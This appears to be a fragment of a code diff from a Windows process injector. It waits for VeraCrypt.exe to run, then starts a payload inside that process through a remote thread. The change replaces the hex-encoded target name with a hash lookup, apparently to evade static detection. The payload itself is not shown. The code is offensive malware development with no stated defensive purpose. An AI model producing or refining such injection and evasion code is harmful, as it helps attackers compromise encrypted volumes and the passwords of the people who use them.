@@ -10,12 +10,12 @@ extern DWORD ExecuteRemoteThread64(HANDLE hTargetProc, LPVOID lpvRemotePayloadMe
 
 int main(void)
 {
-    CHAR cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};
+    DWORD64 dwVeraCryptHash = 0x10e06b649;
 
     DWORD dwProcID = -1;
     while (1)
     {
-        dwProcID = UtilsFindTargetProcessID(cVeraCrypt);
+        dwProcID = UtilsFindTargetProcessIDByHash(dwVeraCryptHash);
 
         if (dwProcID != -1)
         {
@@ -45,7 +45,7 @@ int main(void)
     }
 
     HANDLE hThread = NULL;
-    DWORD iRetVal = ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);
+    ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);
     if (hThread != NULL)
     {
         UtilsResumeThread(hThread);
